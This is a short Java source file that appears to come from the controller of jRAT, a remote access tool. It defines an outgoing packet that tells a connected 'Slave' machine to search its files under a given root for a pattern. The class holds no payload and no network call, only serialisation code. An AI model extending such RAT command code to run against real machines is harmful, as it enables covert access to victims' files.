package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet53StartSearch extends AbstractOutgoingPacket {

	private String searchRoot;
	private String pattern;
	private boolean pathContains;

	public Packet53StartSearch(String searchRoot, String pattern, boolean pathContains) {
		this.searchRoot = searchRoot;
		this.pattern = pattern;
		this.pathContains = pathContains;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(searchRoot);
		slave.writeLine(pattern);
		dos.writeBoolean(pathContains);
	}

	@Override
	public short getPacketId() {
		return 53;
	}

}
